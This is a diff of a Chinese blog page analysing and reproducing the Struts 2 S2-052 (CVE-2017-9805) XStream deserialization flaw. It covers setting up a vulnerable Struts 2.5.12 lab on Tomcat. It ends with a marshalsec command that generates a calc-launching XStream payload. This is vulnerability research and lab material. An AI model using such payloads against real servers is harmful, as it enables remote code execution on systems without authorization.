@@ -19,7 +19,7 @@
 <meta property="og:image" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/s2.png">
 <meta property="og:image" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/show.png">
 <meta property="og:image" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/avil.png">
-<meta property="og:updated_time" content="2017-09-12T15:28:33.306Z">
+<meta property="og:updated_time" content="2017-09-12T15:30:41.613Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="S2-052漏洞分析与验证">
 <meta name="twitter:description" content="基本信息漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12, Struts 2.x漏洞概述：问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。">
@@ -226,7 +226,8 @@
       
         <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>漏洞编号：CVE-2017-9805(S2-052)<br>影响版本：Struts 2.5 - Struts 2.5.12, Struts 2.x<br>漏洞概述：问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。</p>
 <a id="more"></a>
-<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>tomcat部署 war<br>从struts2的官网下载最后受影响的版本struts-2.5.12，地址：<br><a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a><br>注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。<br><img src="s2.png" alt=""></p>
+<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>tomcat部署 war<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">从struts2的官网下载最后受影响的版本struts-2.5.12，地址： </div><div class="line">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip </div><div class="line">注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。</div></pre></td></tr></table></figure></p>
+<p><img src="s2.png" alt=""></p>
 <p>默认配置server.xml 默认不变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</div><div class="line">unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;</div><div class="line">xmlValidation=&quot;false&quot; xmlNamespaceAware=&quot;false&quot;&gt;</div></pre></td></tr></table></figure></p>
 <p>直接使用jspstudy 不可以，有可能精简过环境。新搭建的tomcat9 没有问题</p>
 <h1 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp marshalsec-<span class="number">0.0</span>.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc &gt; <span class="number">1</span>.txt</div></pre></td></tr></table></figure>
